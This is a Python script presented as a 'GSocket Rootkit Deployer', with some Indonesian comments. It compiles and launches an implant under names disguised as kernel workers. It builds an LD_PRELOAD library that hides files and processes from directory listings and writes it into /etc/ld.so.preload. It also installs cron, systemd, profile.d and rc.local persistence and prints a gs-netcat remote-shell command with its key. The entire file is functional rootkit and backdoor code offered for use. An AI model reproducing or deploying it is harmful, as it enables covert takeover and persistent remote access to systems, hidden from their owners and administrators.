#!/usr/bin/env python3
"""
loader.py — GSocket Rootkit Deployer
Deploy implant + install persistence + update libstealth.so
"""

import os
import sys
import subprocess
import time

# ─── CONFIG ───────────────────────────────────────────────────────────────────
GSOCKET_KEY = "63PJN4Wet8jghVLncPfCVh"
STEALTH_SO  = "/usr/lib/libstealth.so"
STEALTH_SRC = "/tmp/.stealth_tmp.c"

HIDE_NAMES = [
    ".kworker",
    ".dbus-session",
    ".systemd-private",
    "implant",
    "gs-netcat",
]

PERSISTENCE_LOCATIONS = [
    "/dev/shm/.kworker",
    "/run/.systemd-private",
    "/tmp/.dbus-session",
]

# ─── HELPERS ──────────────────────────────────────────────────────────────────

def run(cmd, capture=True):
    r = subprocess.run(cmd, shell=True, capture_output=capture, text=True)
    return r.returncode, r.stdout.strip(), r.stderr.strip()

def ok(m):   print(f"\033[92m[+] {m}\033[0m")
def info(m): print(f"\033[94m[*] {m}\033[0m")
def err(m):  print(f"\033[91m[-] {m}\033[0m")
def warn(m): print(f"\033[93m[!] {m}\033[0m")

# ─── GET IMPLANT PIDS ─────────────────────────────────────────────────────────

def get_implant_pids():
    pids = []
    patterns = [
        "kworker/2:1H",
        "kworker/0:0H",
        "kworker/1:1H",
        "gs-netcat",
    ]
    for pat in patterns:
        rc, out, _ = run(f"pgrep -f '{pat}' 2>/dev/null")
        if rc == 0 and out:
            pids += [p for p in out.split() if p.isdigit()]
    return list(set(pids))

# ─── UPDATE LIBSTEALTH.SO ─────────────────────────────────────────────────────

def update_stealth_so(extra_pids=None, extra_names=None):
    hide_names = HIDE_NAMES[:]
    if extra_names:
        hide_names += extra_names

    pids = get_implant_pids()
    if extra_pids:
        pids += extra_pids

    names_str = "\n".join(f'    "{n}",' for n in hide_names)
    pids_str  = "\n".join(f'    "{p}",' for p in pids) if pids else ""

    stealth_c = f"""
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

static const char *hidden_names[] = {{
{names_str}
    NULL
}};

static const char *hidden_prefix = ".x_";

static const char *hidden_pids[] = {{
{pids_str}
    NULL
}};

struct my_dirent64 {{
    uint64_t d_ino;
    int64_t  d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char d_name[];
}};

static int should_hide_name(const char *n) {{
    int i;
    for (i = 0; hidden_names[i]; i++)
        if (strcmp(n, hidden_names[i]) == 0) return 1;
    if (strncmp(n, hidden_prefix, strlen(hidden_prefix)) == 0) return 1;
    return 0;
}}

static int should_hide_pid(const char *n) {{
    int i;
    for (i = 0; hidden_pids[i]; i++)
        if (strcmp(n, hidden_pids[i]) == 0) return 1;
    return 0;
}}

long getdents64(int fd, void *dirp, size_t count) {{
    static long (*real)(int, void*, size_t) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "getdents64");
    long ret = real(fd, dirp, count);
    if (ret <= 0) return ret;
    char *buf = (char *)dirp;
    long offset = 0, new_off = 0;
    while (offset < ret) {{
        struct my_dirent64 *e = (struct my_dirent64 *)(buf + offset);
        offset += e->d_reclen;
        if (should_hide_name(e->d_name)) continue;
        if (new_off != offset - (long)e->d_reclen)
            memmove(buf + new_off, e, e->d_reclen);
        new_off += e->d_reclen;
    }}
    return new_off;
}}

struct dirent *readdir(DIR *d) {{
    static struct dirent* (*real)(DIR*) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real(d)))
        if (!should_hide_pid(e->d_name) && !should_hide_name(e->d_name)) return e;
    return NULL;
}}

struct dirent64 *readdir64(DIR *d) {{
    static struct dirent64* (*real)(DIR*) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = real(d)))
        if (!should_hide_pid(e->d_name) && !should_hide_name(e->d_name)) return e;
    return NULL;
}}

int scandir(const char *path, struct dirent ***list,
            int (*filter)(const struct dirent *),
            int (*compar)(const struct dirent **, const struct dirent **)) {{
    static int (*real)() = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "scandir");
    int n = real(path, list, filter, compar);
    if (n <= 0) return n;
    int new_n = 0, i;
    for (i = 0; i < n; i++) {{
        if (should_hide_name((*list)[i]->d_name)) free((*list)[i]);
        else (*list)[new_n++] = (*list)[i];
    }}
    return new_n;
}}
"""

    with open(STEALTH_SRC, "w") as f:
        f.write(stealth_c)

    info("Compiling libstealth.so...")
    rc, _, err_msg = run(f"gcc -shared -fPIC -o {STEALTH_SO} {STEALTH_SRC} -ldl")
    if rc == 0:
        ok(f"libstealth.so updated — {len(pids)} PIDs, {len(hide_names)} names hidden")
        try:
            os.unlink(STEALTH_SRC)
        except:
            pass
        with open("/etc/ld.so.preload", "w") as f:
            f.write(f"{STEALTH_SO}\n")
        ok("ld.so.preload updated")
    else:
        err(f"libstealth compile error: {err_msg}")

# ─── INSTALL PERSISTENCE ──────────────────────────────────────────────────────

def install_persistence():
    info("Installing persistence...")

    # Cron
    cron_entry = "* * * * * root /dev/shm/.kworker 2>/dev/null\n"
    for cp in ["/etc/cron.d/.systemd-sync"]:
        try:
            os.makedirs(os.path.dirname(cp), exist_ok=True)
            with open(cp, "w") as f:
                f.write(cron_entry)
            os.chmod(cp, 0o600)
            ok(f"Cron: {cp}")
        except Exception as e:
            warn(f"Cron failed: {e}")

    # Systemd
    unit = """[Unit]
Description=DBus Session Helper
After=network.target

[Service]
Type=forking
ExecStart=/run/.systemd-private
Restart=always
RestartSec=3
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
    for up in ["/etc/systemd/system/.dbus-helper.service"]:
        try:
            with open(up, "w") as f:
                f.write(unit)
            run("systemctl enable .dbus-helper 2>/dev/null")
            run("systemctl start .dbus-helper 2>/dev/null")
            ok(f"Systemd: {up}")
        except Exception as e:
            warn(f"Systemd failed: {e}")

    # Profile.d
    try:
        with open("/etc/profile.d/.bash_helper.sh", "w") as f:
            f.write(
                "[ -f /dev/shm/.kworker ] && "
                "/dev/shm/.kworker 2>/dev/null &\n"
            )
        ok("profile.d installed")
    except Exception as e:
        warn(f"profile.d failed: {e}")

    # RC.local
    for rl in ["/etc/rc.local"]:
        if os.path.exists(rl):
            try:
                with open(rl, "r") as f:
                    content = f.read()
                if ".kworker" not in content:
                    new = content.replace(
                        "exit 0",
                        "/dev/shm/.kworker 2>/dev/null &\nexit 0"
                    )
                    with open(rl, "w") as f:
                        f.write(new)
                    ok(f"rc.local: {rl}")
            except Exception as e:
                warn(f"rc.local failed: {e}")

# ─── DEPLOY ───────────────────────────────────────────────────────────────────

def deploy():
    print("""
╔══════════════════════════════════════════════╗
║     GSocket Persistent Rootkit Deployer      ║
╚══════════════════════════════════════════════╝
""")

    # Compile implant
    info("Compiling implant.c...")
    rc, _, err_msg = run("gcc -o implant implant.c -O2 -s 2>&1")
    if rc != 0:
        err(f"Compile failed:\n{err_msg}")
        return
    ok("implant compiled")

    # Copy ke lokasi tersembunyi
    for dest in PERSISTENCE_LOCATIONS:
        try:
            import shutil
            shutil.copy("implant", dest)
            os.chmod(dest, 0o755)
            ok(f"Copied to {dest}")
        except Exception as e:
            warn(f"Copy to {dest} failed: {e}")

    # Launch implant — FIX: pakai Popen bukan run()
    info("Launching implant...")
    try:
        proc = subprocess.Popen(
            ["/dev/shm/.kworker"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True
        )
        ok(f"Implant launched (PID: {proc.pid})")
    except Exception as e:
        warn(f"Launch via /dev/shm failed, trying ./implant: {e}")
        try:
            proc = subprocess.Popen(
                ["./implant"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True
            )
            ok(f"Implant launched (PID: {proc.pid})")
        except Exception as e2:
            err(f"Launch failed: {e2}")
            return

    # Tunggu implant fork
    time.sleep(3)

    # Dapatkan PIDs
    pids = get_implant_pids()
    ok(f"Implant PIDs: {pids}")

    # Update libstealth
    update_stealth_so()

    # Install persistence
    install_persistence()

    # Hapus binary dari working dir
    try:
        os.unlink("implant")
    except:
        pass

    print()
    ok("=" * 50)
    ok("Deploy selesai!")
    ok(f"GSocket key: {GSOCKET_KEY}")
    ok(f"Connect: gs-netcat -s {GSOCKET_KEY} -i")
    ok("=" * 50)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "update-stealth":
            update_stealth_so()
        elif sys.argv[1] == "persistence":
            install_persistence()
        elif sys.argv[1] == "pids":
            print(get_implant_pids())
    else:
        deploy()
